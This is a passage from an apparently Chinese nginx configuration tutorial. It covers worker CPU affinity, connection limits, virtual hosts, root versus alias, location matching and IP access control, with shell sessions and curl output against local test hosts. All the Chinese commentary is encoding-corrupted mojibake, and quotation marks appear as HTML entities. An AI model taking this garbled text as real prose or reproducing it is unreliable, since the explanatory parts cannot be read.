¸å¿ƒä¸Šï¼ˆä»å·¦è‡³å³çš„é¡ºåºï¼‰ï¼Œè€Œä»ç¬¬ä¸‰ä¸ªworkè¿›ç¨‹èµ·å¹¶æœªæŒ‡å®šå¯¹åº”çš„CPUæ ¸å¿ƒï¼Œå› æ­¤å…¨éƒ¨ç»‘å®šåˆ°â€˜ä¸Šä¸€ä¸ªCPUæ ¸å¿ƒâ€™ 0010è¿™ä¸ªCPUæ ¸å¿ƒã€‚ nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: [warn] the number of \u0026#34;worker_processes\u0026#34; is not equal to the number of \u0026#34;worker_cpu_affinity\u0026#34; masks, using last mask for remaining worker processes nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 0 1226 nginx: worker process 0 1227 nginx: worker process 1 1228 nginx: worker process 1 1229 nginx: worker process 1 1249 grep --color=auto nginx 0 #å°†workerè¿›ç¨‹æ•°é‡æ”¹ä¸º2 [root@test conf]# vim nginx.conf [root@test conf]# egrep \u0026#34;processes|affinity\u0026#34; nginx.conf worker_processes 2; worker_cpu_affinity 0001 0010; #è¯­æ³•æ£€æŸ¥ä¸å†è­¦å‘Š [root@test conf]# nginx -s reload [root@test conf]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@test conf]# ps axo pid,cmd,psr | grep nginx 827 nginx: master process /apps 1 1261 nginx: worker process 0 1262 nginx: worker process 1 1265 grep --color=auto nginx 1 #é”™è¯¯æ—¥å¿—è®°å½•é…ç½®ï¼Œè¯­æ³•ï¼šerror_log file [debug | info | notice | warn | error | crit | alert | emerg] #æ‹¬å·å†…ä¸ºæ—¥å¿—è®°å½•è¯¦ç»†çº§åˆ«ï¼ˆä»å·¦è‡³å³é€æ¸æé«˜ï¼‰ ##ç¤ºä¾‹é…ç½® #error_log logs/error.log; #error_log logs/error.log notice; error_log /apps/nginx/logs/error.log error; #pidæ–‡ä»¶ä¿å­˜è·¯å¾„ pid /apps/nginx/logs/nginx.pid; worker_priority 0; #å·¥ä½œè¿›ç¨‹ä¼˜å…ˆçº§ï¼Œ-20~20(19) worker_rlimit_nofile 65536; #æ‰€æœ‰workerè¿›ç¨‹èƒ½æ‰“å¼€çš„æ–‡ä»¶æ•°é‡ä¸Šé™,åŒ…æ‹¬:Nginxçš„æ‰€æœ‰è¿æ¥ï¼ˆä¾‹å¦‚ä¸ä»£ç†æœåŠ¡å™¨çš„è¿æ¥ç­‰ï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸å®¢æˆ·ç«¯çš„è¿æ¥ã€‚è¯¥å€¼æœ€å¥½ä¸ulimit -n æˆ–è€…limits.confçš„å€¼ä¿æŒä¸€è‡´, #é€šè¿‡pamé™åˆ¶æ–‡ä»¶æ‰“å¼€æ•°é‡ä¸Šé™ [root@centos8 ~]#cat /etc/security/limits.conf * soft nofile 1000000 * hard nofile 1000000 #workerè¿›ç¨‹ä¼˜å…ˆçº§ [root@test conf]# grep priority nginx.conf worker_priority 0; [root@test conf]# ps -axo pid,cmd,nice | grep nginx 827 nginx: master process /apps 0 1391 nginx: worker process 0 1392 nginx: worker process 0 1449 grep --color=auto nginx 0 daemon off; #å‰å°è¿è¡ŒNginxæœåŠ¡ï¼Œé€šå¸¸åœ¨æµ‹è¯•ç¯å¢ƒæˆ–è€…dockerç¯å¢ƒä¸­ä½¿ç”¨ master_process off|on; #æ˜¯å¦å¼€å¯Nginxçš„master-workerå·¥ä½œæ¨¡å¼ï¼Œä»…ç”¨äºå¼€å‘è°ƒè¯•åœºæ™¯,é»˜è®¤ä¸ºon events { worker_connections 65536; #è®¾ç½®å•ä¸ªå·¥ä½œè¿›ç¨‹çš„æœ€å¤§å¹¶å‘è¿æ¥æ•° use epoll; #ä½¿ç”¨epolläº‹ä»¶é©±åŠ¨ï¼ŒNginxæ”¯æŒä¼—å¤šçš„äº‹ä»¶é©±åŠ¨ï¼Œæ¯”å¦‚:selectã€pollã€epollï¼Œåªèƒ½è®¾ç½®åœ¨eventsæ¨¡å—ä¸­è®¾ç½®ã€‚ accept_mutex on; #onä¸ºåŒä¸€æ—¶åˆ»ä¸€ä¸ªè¯·æ±‚è½®æµç”±workè¿›ç¨‹å¤„ç†,è€Œé˜²æ­¢è¢«åŒæ—¶å”¤é†’æ‰€æœ‰worker,é¿å…å¤šä¸ªç¡çœ è¿›ç¨‹è¢«å”¤é†’çš„è®¾ç½®ï¼Œé»˜è®¤ä¸ºoffï¼Œæ–°è¯·æ±‚ä¼šå”¤é†’æ‰€æœ‰workerè¿›ç¨‹,æ­¤è¿‡ç¨‹ä¹Ÿç§°ä¸º\u0026#34;æƒŠç¾¤\u0026#34;ï¼Œå› æ­¤nginxåˆšå®‰è£…å®Œä»¥åè¦è¿›è¡Œé€‚å½“çš„ä¼˜åŒ–ã€‚å»ºè®®è®¾ç½®ä¸ºon multi_accept on; #onæ—¶NginxæœåŠ¡å™¨çš„æ¯ä¸ªå·¥ä½œè¿›ç¨‹å¯ä»¥åŒæ—¶æ¥å—å¤šä¸ªæ–°çš„ç½‘ç»œè¿æ¥ï¼Œæ­¤æŒ‡ä»¤é»˜è®¤ä¸ºoffï¼Œå³é»˜è®¤ä¸ºä¸€ä¸ªå·¥ä½œè¿›ç¨‹åªèƒ½ä¸€æ¬¡æ¥å—ä¸€ä¸ªæ–°çš„ç½‘ç»œè¿æ¥ï¼Œæ‰“å¼€åå‡ ä¸ªåŒæ—¶æ¥å—å¤šä¸ªã€‚å»ºè®®è®¾ç½®ä¸ºon } èŒƒä¾‹ï¼šå®ç°nginxçš„é«˜å¹¶å‘é…ç½®\n[root@localhost conf]# ulimit -n 10 [root@localhost conf]# cat /apps/nginx/conf/nginx.conf | grep rlimit worker_rlimit_nofile 100; #é»˜è®¤é…ç½®ä¸æ”¯æŒé«˜å¹¶å‘ï¼Œå½“worker_rlimit_nofileè®¾ç½®çš„å€¼å¤§äºulimit -nçš„å€¼,ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯æ—¥å¿— [root@localhost conf]# ab -c 5000 -n 10000 http://127.0.0.1/ This is ApacheBench, Version 2.3 \u0026lt;$Revision: 1430300 $\u0026gt; Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 127.0.0.1 (be patient) socket: Too many open files (24) #æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦è¿‡å¤š http é…ç½®å— http åè®®ç›¸å…³çš„é…ç½®ç»“æ„\nhttp { ... ... server { #æ¯ä¸ªserverç”¨äºå®šä¹‰ä¸€ä¸ªè™šæ‹Ÿä¸»æœº,ç¬¬ä¸€ä¸ªserverä¸ºé»˜è®¤è™šæ‹ŸæœåŠ¡å™¨ ... } server { ... server_name #è™šæ‹Ÿä¸»æœºå root #ä¸»ç›®å½• alias #è·¯å¾„åˆ«å location [OPERATOR] URL { #æŒ‡å®šURLçš„ç‰¹æ€§ ... if CONDITION { ... } } } } http åè®®é…ç½®è¯´æ˜\nhttp { include mime.types; #å¯¼å…¥æ”¯æŒçš„æ–‡ä»¶ç±»å‹,æ˜¯ç›¸å¯¹äº/apps/nginx/confç›®å½• default_type application/octet-stream; #é™¤mime.typesä¸­æ–‡ä»¶ç±»å‹å¤–,è®¾ç½®å…¶å®ƒæ–‡ä»¶é»˜è®¤ç±»å‹ï¼Œè®¿é—®å…¶å®ƒç±»å‹æ—¶ä¼šæç¤ºä¸‹è½½ä¸åŒ¹é…çš„ç±»å‹æ–‡ä»¶ #æ—¥å¿—é…ç½®éƒ¨åˆ† #log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; # \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; # \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; #access_log logs/access.log main; #è‡ªå®šä¹‰ä¼˜åŒ–å‚æ•° sendfile on; #tcp_nopush on; #åœ¨å¼€å¯äº†sendfileçš„æƒ…å†µä¸‹ï¼Œåˆå¹¶è¯·æ±‚åç»Ÿä¸€å‘é€ç»™å®¢æˆ·ç«¯,å¿…é¡»å¼€å¯sendfile #tcp_nodelay off; #åœ¨å¼€å¯äº†keepalivedæ¨¡å¼ä¸‹çš„è¿æ¥æ˜¯å¦å¯ç”¨TCP_NODELAYé€‰é¡¹ï¼Œå½“ä¸ºoffæ—¶ï¼Œå»¶è¿Ÿ0.2så‘é€ï¼Œé»˜è®¤Onæ—¶ï¼Œä¸å»¶è¿Ÿå‘é€ï¼Œç«‹å³å‘é€ç”¨æˆ·å“åº”æŠ¥æ–‡ã€‚ #keepalive_timeout 0; keepalive_timeout 65 66; #è®¾ç½®ä¼šè¯ä¿æŒæ—¶é—´,ç¬¬äºŒä¸ªå€¼ä¸ºå“åº”é¦–éƒ¨:keep-Alived:timeout=65,å¯ä»¥å’Œç¬¬ä¸€ä¸ªå€¼ä¸åŒ #gzip on; #å¼€å¯æ–‡ä»¶å‹ç¼© server { listen 80; #è®¾ç½®ç›‘å¬åœ°å€å’Œç«¯å£ server_name localhost; #è®¾ç½®server nameï¼Œå¯ä»¥ä»¥ç©ºæ ¼éš”å¼€å†™å¤šä¸ªå¹¶æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚:*.magedu.com www.magedu.* ~^www\\d+\\.magedu\\.com$ default_server #charset koi8-r; #è®¾ç½®ç¼–ç æ ¼å¼ï¼Œé»˜è®¤æ˜¯ä¿„è¯­æ ¼å¼ï¼Œå»ºè®®æ”¹ä¸ºutf-8 #access_log logs/host.access.log main; location / { root html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; #å®šä¹‰é”™è¯¯é¡µé¢ location = /50x.html { root html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { #ä»¥httpçš„æ–¹å¼è½¬å‘phpè¯·æ±‚åˆ°æŒ‡å®šwebæœåŠ¡å™¨ # proxy_pass http://127.0.0.1; #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ { #ä»¥fastcgiçš„æ–¹å¼è½¬å‘phpè¯·æ±‚åˆ°phpå¤„ç† # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache\u0026#39;s document root # concurs with nginx\u0026#39;s one # #location ~ /\\.ht { #æ‹’ç»webå½¢å¼è®¿é—®æŒ‡å®šæ–‡ä»¶ï¼Œå¦‚å¾ˆå¤šçš„ç½‘ç«™éƒ½æ˜¯é€šè¿‡.htaccessæ–‡ä»¶æ¥æ”¹å˜è‡ªå·±çš„é‡å®šå‘ç­‰åŠŸèƒ½ã€‚ # deny all; #} location ~ /passwd.html { deny all; } } # another virtual host using mix of IP-, name-, and port-based configuration # #server { #è‡ªå®šä¹‰è™šæ‹Ÿserver # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / { # root html; # index index.html index.htm; #æŒ‡å®šé»˜è®¤ç½‘é¡µæ–‡ä»¶ï¼Œæ­¤æŒ‡ä»¤ç”±ngx_http_index_moduleæ¨¡å—æä¾› # } #} # HTTPS server # #server { #httpsæœåŠ¡å™¨é…ç½® # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / { # root html; # index index.html index.htm; # } #} MIME MIMEå‚è€ƒæ–‡æ¡£ï¼š https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types\n#åœ¨å“åº”æŠ¥æ–‡ä¸­å°†æŒ‡å®šçš„æ–‡ä»¶æ‰©å±•åæ˜ å°„è‡³MIMEå¯¹åº”çš„ç±»å‹ include mime.types; default_type application/octet-stream;#é™¤mime.typesä¸­çš„ç±»å‹å¤–ï¼ŒæŒ‡å®šå…¶å®ƒæ–‡ä»¶çš„é»˜è®¤MIMEç±»å‹ï¼Œæµè§ˆå™¨ä¸€èˆ¬ä¼šæç¤ºä¸‹è½½ types { text/html html; image/gif gif; image/jpeg jpg; } èŒƒä¾‹ï¼š\n#æœªå®šä¹‰mime.typesç±»å‹ [root@localhost nginx]# ll html/mime.types ls: cannot access html/mime.types: No such file or directory [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:23:54 GMT Content-Type: application/octet-stream #mimeæœªå®šä¹‰çš„ç±»å‹é»˜è®¤è§†ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶å¤„ç†ï¼ˆå¦‚æœæ˜¯æµè§ˆå™¨è®¿é—®ï¼Œåˆ™ä¼šä¸‹è½½test.phpæ–‡ä»¶ï¼‰ Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 #é•¿è¿æ¥æ˜¾ç¤ºçš„æ—¶é•¿ï¼Œç”±keepalive_timeout 65 66; é…ç½® ETag: \u0026#34;62e270d4-14\u0026#34; Accept-Ranges: bytes #ä¿®æ”¹é»˜è®¤æ–‡ä»¶ç±»å‹ [root@localhost nginx]# cat conf/nginx.conf | grep default_type default_type text/html; [root@localhost nginx]# nginx -s reload [root@localhost nginx]# curl localhost/test.php -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 28 Jul 2022 11:32:15 GMT Content-Type: text/html #å°†test.phpè¯†åˆ«ä¸ºæ–‡æœ¬æ–‡ä»¶ï¼ˆå¦‚æœæ˜¯æµè§ˆå™¨è®¿é—®ï¼Œç›´æ¥æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼‰ Content-Length: 20 Last-Modified: Thu, 28 Jul 2022 11:19:48 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e270d4-14\u0026#34; Accept-Ranges: bytes æŒ‡å®šå“åº”æŠ¥æ–‡ #æ˜¯å¦åœ¨å“åº”æŠ¥æ–‡ä¸­çš„Content-Typeæ˜¾ç¤ºæŒ‡å®šçš„å­—ç¬¦é›†ï¼Œé»˜è®¤offä¸æ˜¾ç¤º charset charset | off; #ç¤ºä¾‹ charset utf-8; #æ˜¯å¦åœ¨å“åº”æŠ¥æ–‡çš„Serveré¦–éƒ¨æ˜¾ç¤ºnginxç‰ˆæœ¬ server_tokens on | off | build | string; èŒƒä¾‹ï¼šæºç ä¿®æ”¹serverå­—æ®µ\n#å¦‚æœæƒ³è‡ªå®šä¹‰å“åº”æŠ¥æ–‡çš„nginxç‰ˆæœ¬ä¿¡æ¯ï¼Œéœ€è¦ä¿®æ”¹æºç æ–‡ä»¶ï¼Œé‡æ–°ç¼–è¯‘ #å¦‚æœserver_tokens onï¼Œä¿®æ”¹ src/core/nginx.h ä¿®æ”¹ç¬¬13-14è¡Œï¼Œå¦‚ä¸‹ç¤ºä¾‹ #define NGINX_VERSION \u0026#34;1.68.9\u0026#34; #define NGINX_VER \u0026#34;mynginx/\u0026#34; NGINX_VERSION #å¦‚æœserver_tokens offï¼Œä¿®æ”¹ src/http/ngx_http_header_filter_module.c ç¬¬49è¡Œï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š static char ngx_http_server_string[] = \u0026#34;Server: nginx\u0026#34; CRLF; #æŠŠå…¶ä¸­çš„nginxæ”¹ä¸ºè‡ªå·±æƒ³è¦çš„æ–‡å­—å³å¯,å¦‚ï¼šmynginx æ ¸å¿ƒé…ç½®ç¤ºä¾‹ è™šæ‹Ÿä¸»æœºçš„å®ç° åŸºäºä¸åŒçš„IPã€ä¸åŒçš„ç«¯å£ä»¥åŠä¸ç”¨åŸŸåå®ç°ä¸åŒçš„è™šæ‹Ÿä¸»æœºï¼Œä¾èµ–äºæ ¸å¿ƒæ¨¡å—ngx_http_core_moduleå®ç°ã€‚\næ–°å»ºä¸¤ä¸ªè™šæ‹Ÿä¸»æœº # æ·»åŠ åŸŸåè§£æ [root@localhost conf.d]# cat /etc/hosts |grep test 172.16.16.88 pc.test.org mobile.test.org ## å¼€å§‹æ–°å»ºè™šæ‹Ÿä¸»æœº root@localhost nginx]# mkdir /apps/nginx/conf/conf.d [root@localhost nginx]# cd /apps/nginx/conf/conf.d/ [root@localhost conf.d]# vim /apps/nginx/conf/nginx.conf ...... include /apps/nginx/conf.d/*.conf; #åœ¨é…ç½®æ–‡ä»¶çš„æœ€åé¢æ·»åŠ æ­¤è¡Œ,æ³¨æ„ä¸è¦æ”¾åœ¨æœ€å‰é¢,ä¼šå¯¼è‡´å‰é¢çš„é…ç½®æ— æ³•ç”Ÿæ•ˆï¼ˆæ–‡ä»¶é…ç½®ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ç”Ÿæ•ˆï¼‰ [root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } } [root@localhost conf.d]# mkdir /apps/nginx/html/pc [root@localhost conf.d]# echo pc_page \u0026gt; /apps/nginx/html/pc/index.html [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org #è™šæ‹Ÿä¸»æœºpc pc_page [root@localhost conf.d]# cat mobile.conf server { listen 80; server_name mobile.test.org; location / { root html/mobile; } } [root@localhost conf.d]# mkdir /apps/nginx/html/mobile #è™šæ‹Ÿä¸»æœºmobile [root@localhost conf.d]# echo mobile_page \u0026gt; /apps/nginx/html/mobile/index.html mobile_page root ä¸ alias çš„åŒºåˆ« rootï¼šæŒ‡å®šwebçš„å®¶ç›®å½•ï¼Œåœ¨å®šä¹‰locationçš„æ—¶å€™ï¼Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ç­‰äº root+location\nèŒƒä¾‹:\n[root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { root /opt/html; #å®é™…è·¯å¾„ä¸º/opt/html/about/index.html } } [root@localhost conf.d]# ll /opt/html/about/ total 4 -rw-r--r-- 1 root root 11 Jul 28 23:24 index.html [root@localhost conf.d]# cat /opt/html/about/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page aliasï¼šå®šä¹‰è·¯å¾„åˆ«åï¼Œä¼šæŠŠè®¿é—®çš„è·¯å¾„é‡æ–°å®šä¹‰åˆ°å…¶æŒ‡å®šçš„è·¯å¾„,æ–‡æ¡£æ˜ å°„çš„å¦ä¸€ç§æœºåˆ¶;ä»…èƒ½ç”¨äºlocationä¸Šä¸‹æ–‡,æ­¤æŒ‡ä»¤ä½¿ç”¨è¾ƒå°‘\nèŒƒä¾‹ï¼š\n[root@localhost conf.d]# cat pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /about { alias /opt/html; #å®é™…è·¯å¾„ä¸º/opt/html/index.html } } [root@localhost conf.d]# cat /opt/html/index.html about_page [root@localhost conf.d]# nginx -s reload [root@localhost conf.d]# curl pc.test.org/about/ about_page localtion çš„åŒ¹é…è§„åˆ™ åœ¨ä¸€ä¸ªserverä¸­locationé…ç½®æ®µå¯å­˜åœ¨å¤šä¸ªï¼Œç”¨äºå®ç°ä»uriåˆ°æ–‡ä»¶ç³»ç»Ÿçš„è·¯å¾„æ˜ å°„ï¼›ngnixä¼šæ ¹æ®ç”¨æˆ·è¯·\næ±‚çš„URIæ¥æ£€æŸ¥å®šä¹‰çš„æ‰€æœ‰locationï¼ŒæŒ‰ä¸€å®šçš„ä¼˜å…ˆçº§æ‰¾å‡ºä¸€ä¸ªæœ€ä½³åŒ¹é…ï¼Œè€Œåè¿›è¡Œå¤„ç†ã€‚\nlocation å®˜æ–¹å¸®åŠ©: http://nginx.org/en/docs/http/ngx_http_core_module.html#location\n#è¯­æ³•è§„åˆ™ï¼š location [ = | ~ | ~* | ^~ ] uri { ... } = #ç”¨äºæ ‡å‡†uriå‰ï¼Œéœ€è¦è¯·æ±‚å­—ä¸²ä¸uriç²¾ç¡®åŒ¹é…ï¼Œå¤§å°æ•æ„Ÿ,å¦‚æœåŒ¹é…æˆåŠŸå°±åœæ­¢å‘ä¸‹åŒ¹é…å¹¶ç«‹å³å¤„ç†è¯·æ±‚ ^~ #ç”¨äºæ ‡å‡†uriå‰ï¼Œè¡¨ç¤ºåŒ…å«æ­£åˆ™è¡¨è¾¾å¼,å¹¶ä¸”åŒ¹é…ä»¥æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼å¼€å¤´,å¯¹URIçš„æœ€å·¦è¾¹éƒ¨åˆ†åšåŒ¹é…æ£€æŸ¥ï¼Œä¸åŒºåˆ†å­—ç¬¦å¤§å°å†™ ~ #ç”¨äºæ ‡å‡†uriå‰ï¼Œè¡¨ç¤ºåŒ…å«æ­£åˆ™è¡¨è¾¾å¼,å¹¶ä¸”åŒºåˆ†å¤§å°å†™ ~* #ç”¨äºæ ‡å‡†uriå‰ï¼Œè¡¨ç¤ºåŒ…å«æ­£åˆ™è¡¨è¾¾å¼,å¹¶ä¸”ä¸åŒºåˆ†å¤§å°å†™ ä¸å¸¦ç¬¦å· #åŒ¹é…èµ·å§‹äºæ­¤uriçš„æ‰€æœ‰çš„uri \\ #ç”¨äºæ ‡å‡†uriå‰ï¼Œè¡¨ç¤ºåŒ…å«æ­£åˆ™è¡¨è¾¾å¼å¹¶ä¸”è½¬ä¹‰å­—ç¬¦ã€‚å¯ä»¥å°† . * ?ç­‰è½¬ä¹‰ä¸ºæ™®é€šç¬¦å· #åŒ¹é…ä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼š =, ^~, ~/~*, ä¸å¸¦ç¬¦å· å®˜æ–¹èŒƒä¾‹\nlocation = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E ] } The â€œ/â€ request will match configuration A(?), the â€œ/index.htmlâ€ request will match configuration B, the â€œ/documents/document.htmlâ€ request will match configuration C, the â€œ/images/1.gifâ€ request will match configuration D, and the â€œ/documents/1.jpgâ€ request will match configuration E. åŒ¹é…æ¡ˆä¾‹-ç²¾ç¡®åŒ¹é… åœ¨serveréƒ¨åˆ†ä½¿ç”¨locationé…ç½®ä¸€ä¸ªwebç•Œé¢ï¼Œä¾‹å¦‚ï¼šå½“è®¿é—®nginxæœåŠ¡å™¨çš„/logo.jpgçš„æ—¶å€™è¦æ˜¾ç¤ºæŒ‡å®šhtmlæ–‡ä»¶çš„å†…å®¹\nç²¾ç¡®åŒ¹é…ä¸€èˆ¬ç”¨äºåŒ¹é…ç½‘ç«™logoç­‰ç›¸å¯¹å›ºå®šçš„URL\nèŒƒä¾‹ï¼šç²¾ç¡®åŒ¹é…\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location /logo.jpg { root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/logo.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/logo.jpg #è®¿é—®æˆåŠŸ [root@localhost images]# curl pc.test.org/logo.jpg -I HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:17:35 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes åŒ¹é…æ¡ˆä¾‹-åŒºåˆ†å¤§å°å†™ ~ å®ç°åŒºåˆ†å¤§å°å†™çš„æ¨¡ç³ŠåŒ¹é…\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~ /A.?\\.jpg { #åŒ¹é…å­—æ¯Aå¼€å¤´çš„jpgå›¾ç‰‡ï¼Œåé¢?è¡¨ç¤ºAåé¢é›¶æ¬¡æˆ–ä¸€ä¸ªå­—ç¬¦ root html/images; } } #ç¡®ä¿èµ„æºå­˜åœ¨ [root@localhost images]# ll /apps/nginx/html/images/A.jpg -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/A.jpg [root@localhost images]# nginx -s reload #ä»¥å¤§å†™URIè®¿é—®æˆåŠŸ [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:52 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes #ä»¥å°å†™URIè®¿é—®å¤±è´¥ [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:27:55 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 åŒ¹é…æ¡ˆä¾‹-ä¸åŒºåˆ†å¤§å°å†™ ~* ç”¨æ¥å¯¹ç”¨æˆ·è¯·æ±‚çš„uriåšæ¨¡ç³ŠåŒ¹é…ã€‚\næ³¨æ„ï¼šå°½ç®¡åŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†å®é™…è¯·æ±‚æ˜¯ä»ä¼šä»¥ç”¨æˆ·è¯·æ±‚çš„uriå»å¯»æ‰¾ç›¸åº”çš„ç£ç›˜æ–‡ä»¶ï¼Œå¦‚ç”¨æˆ·è®¿é—®uriä¸º/A.jpgï¼Œåœ¨locationæ¡ä»¶é€šè¿‡åå°±åœ¨å¯¹åº”è·¯å¾„ä¸‹å¯»æ‰¾ç£ç›˜ä¸­çš„A.jpgæ–‡ä»¶ï¼Œå¦‚æœç£ç›˜ä¸Šæ˜¯a.jpgï¼Œåˆ™è¯·æ±‚æ˜¯å¤±è´¥çš„ï¼ˆåœ¨windowç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åä¸åŒºåˆ†å¤§å°å†™ï¼Œè¯¥è¯·æ±‚ä¼šæˆåŠŸâ€”â€”å—æ–‡ä»¶ç³»ç»Ÿå½±å“ï¼‰ã€‚\n[root@localhost images]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root html/pc; } location ~* /A.?\\.jpg { #åŒ¹é…è§„åˆ™ä¸åŒºåˆ†å¤§å°å†™ root html/images; } } [root@localhost images]# ll /apps/nginx/html/images/a.jpg #ç£ç›˜ä¸­ä»…å­˜åœ¨a.jpgæ–‡ä»¶ -rw-r--r-- 1 root root 13110 Jul 29 15:11 /apps/nginx/html/images/a.jpg [root@localhost images]# nginx -s reload #è®¿é—®/a.jpgæˆåŠŸ [root@localhost images]# curl -I pc.test.org/a.jpg HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:25 GMT Content-Type: image/jpeg Content-Length: 13110 Last-Modified: Fri, 29 Jul 2022 07:11:49 GMT Connection: keep-alive Keep-Alive: timeout=66 ETag: \u0026#34;62e38835-3336\u0026#34; Accept-Ranges: bytes #è®¿é—®/A.jpgå¤±è´¥ã€‚locationåŒ¹é…æˆåŠŸï¼Œä½†ç£ç›˜ä¸Šå¹¶æ— A.jpgæ–‡ä»¶ [root@localhost images]# curl -I pc.test.org/A.jpg HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Fri, 29 Jul 2022 15:41:48 GMT Content-Type: text/html Content-Length: 153 Connection: keep-alive Keep-Alive: timeout=66 nginx å››å±‚è®¿é—®æ§åˆ¶ è®¿é—®æ§åˆ¶åŸºäºæ¨¡å—ngx_http_access_moduleå®ç°ï¼Œå¯ä»¥é€šè¿‡åŒ¹é…å®¢æˆ·ç«¯æºIPåœ°å€è¿›è¡Œé™åˆ¶\næ³¨æ„: å¦‚æœèƒ½åœ¨é˜²ç«å¢™è®¾å¤‡æ§åˆ¶, æœ€å¥½å°±ä¸è¦åœ¨nginxä¸Šé…ç½®,å¯ä»¥æ›´å¥½çš„èŠ‚çº¦èµ„æº\nå®˜æ–¹å¸®åŠ©: http://nginx.org/en/docs/http/ngx_http_access_module.html\nèŒƒä¾‹ï¼š\n## åŒ¹é…æ—¶æŒ‰ä»ä¸Šè‡³ä¸‹çš„è§„åˆ™è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…åˆ°ç›¸åº”è§„åˆ™å³åœæ­¢â€”â€”â€”ä¸é˜²ç«å¢™çš„åŒ¹é…è§„åˆ™ç±»ä¼¼ #å¦‚ï¼šæœ‰å®¢æˆ·ç«¯ï¼ˆIPï¼š10.1.1.0ï¼‰è®¿é—®é…ç½®äº†ä»¥ä¸‹è§„åˆ™çš„webæœåŠ¡å™¨æ—¶(è®¿é—®URI:/about)ï¼Œè§¦å‘location /aboutè¯­å¥å—ï¼ŒåŒ¹é…åˆ°allow 10.1.1.0/16ï¼Œè®¿é—®æ§åˆ¶ç”Ÿæ•ˆï¼Œè®¿é—®æˆåŠŸã€‚ location = /login/ { root /data/nginx/html/pc; allow 10.0.0.0/24; deny all; } location /about { alias /data/nginx/html/pc; index index.html; deny 192.168.1.1; allow 192.168.1.0/24; allow 10.1.1.0/16; allow 2001:0db8::/32; deny all; #æŒ‰å…ˆå°èŒƒå›´åˆ°å¤§èŒƒå›´æ’åº 